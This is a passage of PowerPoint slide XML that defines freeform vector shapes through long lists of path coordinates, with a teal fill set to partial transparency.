                </a:lnTo>
                <a:lnTo>
                  <a:pt x="272173" y="584200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258381" y="622300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="250151" y="673100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="247408" y="723900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="250075" y="762000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258064" y="812800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258127" y="825500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258203" y="838200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258279" y="850900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="259981" y="876300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="264464" y="914400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="273050" y="939800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="244233" y="977900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="219100" y="1016000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="198056" y="1054100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="181483" y="1104900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="169748" y="1143000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="163283" y="1193800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162445" y="1244600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="167640" y="1295400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="166903" y="1346200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="174345" y="1384300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="188556" y="1435100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="208165" y="1473200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="231800" y="1524000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258064" y="1562100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="252552" y="1600200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="252501" y="1612900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="252387" y="1638300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="253542" y="1689100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="251968" y="1739900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="250177" y="1803400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="252742" y="1854200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="260540" y="1892300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="274434" y="1943100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="295313" y="1981200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="324040" y="2006600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="361492" y="2032000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="408559" y="2044700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="469341" y="2057400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="519252" y="2082800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="560832" y="2095500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="596696" y="2120900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="629386" y="2133600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="661504" y="2159000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="695604" y="2171700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="734288" y="2197100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="780110" y="2209800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="835660" y="2222500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="900087" y="2247900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="957757" y="2260600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1009548" y="2286000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1056322" y="2324100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1098981" y="2349500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1138389" y="2362200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1175448" y="2387600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1245997" y="2387600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1406906" y="2336800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1449133" y="2324100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1493075" y="2298700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1539214" y="2286000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1587995" y="2273300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1639887" y="2247900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1695361" y="2222500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1735035" y="2197100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1754886" y="2184400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1815680" y="2146300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1874583" y="2120900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1931225" y="2095500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1985302" y="2070100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2036457" y="2057400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2084374" y="2044700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2128710" y="2032000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2169134" y="2019300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2205317" y="2006600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2263648" y="1968500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2293150" y="1955800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2328151" y="1930400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2367978" y="1917700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2411996" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2459571" y="1892300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2510040" y="1879600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2562783" y="1854200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2617127" y="1841500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2672435" y="1816100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2728087" y="1778000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2689999" y="1778000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2651772" y="1752600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2612517" y="1739900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2571369" y="1727200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2570022" y="1676400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2570708" y="1625600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2572474" y="1574800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2574366" y="1524000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2575433" y="1473200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2574760" y="1435100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2573909" y="1422400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2571369" y="1384300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2616911" y="1371600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2684322" y="1346200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2728087" y="1320800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2680347" y="1308100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2585656" y="1257300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2487041" y="1231900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2484526" y="1193800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2485288" y="1155700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2487612" y="1117600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2489797" y="1066800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2489898" y="1054100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2489987" y="1041400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2490076" y="1028700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2490178" y="1016000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2489123" y="990600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2487041" y="939800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2533497" y="914400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2576030" y="901700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2693619" y="863600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2734056" y="838200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2701950" y="825500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2666187" y="812800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2625191" y="800100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2577465" y="787400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2572410" y="723900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2571292" y="673100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2572753" y="622300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2575445" y="571500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2578023" y="533400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2578773" y="508000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2579141" y="495300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2577465" y="457200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2617851" y="431800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2653563" y="431800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2690368" y="419100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2734056" y="393700"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6251676" y="3549408"/>
            <a:ext cx="3197225" cy="2564765"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3197225" h="2564765">
                <a:moveTo>
                  <a:pt x="391439" y="219443"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="349440" y="187439"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="311251" y="154787"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="277329" y="120624"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="248094" y="84035"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="224002" y="44132"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="205511" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="181305" y="38862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="153746" y="79044"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="123304" y="118859"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="90474" y="156654"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="55727" y="190741"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19583" y="219443"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="66560" y="253288"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107175" y="286029"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="141401" y="319316"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="169214" y="354799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190588" y="394119"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="205511" y="438899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="226174" y="392722"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="252323" y="349580"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="282943" y="310083"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="317004" y="274815"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="353517" y="244411"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="391439" y="219443"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="3197225" h="2564765">
                <a:moveTo>
                  <a:pt x="1653768" y="205803"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1650263" y="146164"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1634490" y="110032"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1595399" y="91427"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1575765" y="94437"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1557439" y="107797"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1544370" y="126669"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1540535" y="146164"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1541310" y="208064"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1540357" y="259384"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1536738" y="347840"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1535887" y="393712"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1536852" y="446532"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1540535" y="510654"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1557769" y="551649"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1595399" y="565391"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1617256" y="557580"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1634540" y="546176"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1645970" y="530694"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1650263" y="510654"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1644230" y="445566"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1643392" y="391680"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1645831" y="344881"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1649641" y="301040"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1652917" y="256057"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1653768" y="205803"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="3197225" h="2564765">
                <a:moveTo>
                  <a:pt x="3197123" y="2132800"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="3182620" y="2081999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3175419" y="2031199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3171037" y="1980399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3168675" y="1929599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3167545" y="1866099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3166846" y="1802599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3165779" y="1751799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3163557" y="1688299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3159391" y="1637499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3152470" y="1599399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3142005" y="1561299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3133433" y="1535899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3128314" y="1497799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3125914" y="1459699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3125444" y="1408899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3126181" y="1358099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3127337" y="1307299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3128162" y="1243799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3127921" y="1192999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3125825" y="1129499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3121152" y="1078699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3113113" y="1027899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3100971" y="977099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3083966" y="938999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3054604" y="888199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3033687" y="875499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2984030" y="875499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2969895" y="862799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2956331" y="875499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2944418" y="824699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2942983" y="799299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2942259" y="786599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2944241" y="748499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2944711" y="710399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2938043" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2908833" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2908833" y="1942299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2885490" y="1954999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2858960" y="1967699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2829369" y="1967699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2796908" y="1980399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2761742" y="1993099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2724023" y="2005799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2683929" y="2018499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2641612" y="2018499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2551023" y="2043899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2503055" y="2056599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2402649" y="2081999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2350541" y="2107400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2188527" y="2145500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2133181" y="2170900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2077453" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1744103" y="2336000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1690268" y="2374100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1701380" y="2361400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1745869" y="2310600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1802955" y="2272500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1861172" y="2221700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1920201" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2098662" y="2069299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2215388" y="2018499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2272068" y="1993099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2327160" y="1967699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2380335" y="1954999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2431237" y="1929599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2479548" y="1916899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2524912" y="1904199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2567000" y="1891499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2605468" y="1878799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2639974" y="1878799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2670175" y="1866099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2695727" y="1866099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2716301" y="1853399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2795447" y="1853399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2813964" y="1840699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2807068" y="1802599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2803055" y="1764499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2801061" y="1713699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2800210" y="1662899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2800096" y="1650199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2799981" y="1637499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2799880" y="1624799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2799765" y="1612099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2799651" y="1599399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2798534" y="1548599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2795981" y="1497799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2791142" y="1446999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2783154" y="1396199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2771165" y="1358099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2760624" y="1319999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2754338" y="1269199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2751302" y="1218399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2750489" y="1180299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2750655" y="1154899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2750731" y="1142199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2750820" y="1129499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2750896" y="1116799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2751531" y="1065999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2751417" y="1027899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2751378" y="1015199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2749435" y="964399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2744686" y="900899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2736138" y="850099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2722778" y="799299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2799359" y="799299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2814536" y="850099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2825699" y="888199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2833484" y="938999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2838488" y="977099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2841371" y="1015199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2842717" y="1065999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2843187" y="1104099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2843403" y="1154899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2843961" y="1205699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2845524" y="1256499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2848686" y="1307299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2854096" y="1370799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2860789" y="1434299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2866301" y="1485099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2870911" y="1535899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2874886" y="1586699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2882112" y="1675599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2885910" y="1726399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2890202" y="1777199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2895257" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2901378" y="1878799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2908833" y="1942299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2908833" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2711856" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2702598" y="608799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2702077" y="583399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2701569" y="557999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2701442" y="545299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2701328" y="532599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2701213" y="519899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2701099" y="507199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2693568" y="469099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2682138" y="456399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2657119" y="456399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2657119" y="1713699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2631236" y="1726399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2573972" y="1726399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2542603" y="1739099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2509393" y="1739099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2437511" y="1764499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2398839" y="1777199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2358352" y="1789899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2316061" y="1802599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2271953" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2226043" y="1840699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2178329" y="1866099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2128812" y="1891499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2077504" y="1916899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2024392" y="1954999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1969503" y="1980399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1912823" y="2018499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1854352" y="2056599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1794116" y="2094699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1732089" y="2132800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1668297" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1663179" y="2145500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1663255" y="2132800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1663331" y="2120100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1663407" y="2107400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1663484" y="2094699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1667230" y="2056599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1672437" y="2005799"/>
                </a:lnTo>
